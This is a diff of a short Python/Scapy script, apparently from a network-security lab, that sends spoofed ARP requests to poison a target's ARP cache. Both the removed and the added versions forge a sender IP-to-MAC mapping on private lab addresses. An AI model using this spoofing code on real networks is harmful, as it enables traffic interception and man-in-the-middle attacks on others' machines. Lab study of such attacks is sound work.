@@ -1,29 +1,8 @@
 #!/usr/bin/python3
 from scapy.all import *
 
-# Define variables
-VM_A_IP = "10.0.2.6"
-VM_A_MAC = "08:00:27:84:5e:b9"
-VICTIM_IP = "10.0.2.99"
-FAKE_MAC = "aa:bb:cc:dd:ee:ff"
+E = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast
+A = ARP(op=1, psrc="10.9.0.6", hwsrc="02:42:0a:09:00:99", pdst="10.9.0.5")
 
-print("SENDING SPOOFED ARP REQUEST......")
-
-# Create the Ethernet layer
-ether = Ether()
-ether.dst = VM_A_MAC
-ether.src = FAKE_MAC
-
-# Create the ARP layer
-arp = ARP()
-arp.psrc = VICTIM_IP
-arp.hwsrc = FAKE_MAC
-arp.pdst = VM_A_IP
-arp.hwdst = VM_A_MAC
-arp.op = 1  # 1 for ARP request, 2 for ARP reply
-
-# Combine the layers into a single frame
-frame = ether / arp
-
-# Send the spoofed ARP packet
-sendp(frame)
+pkt = E/A
+sendp(pkt)
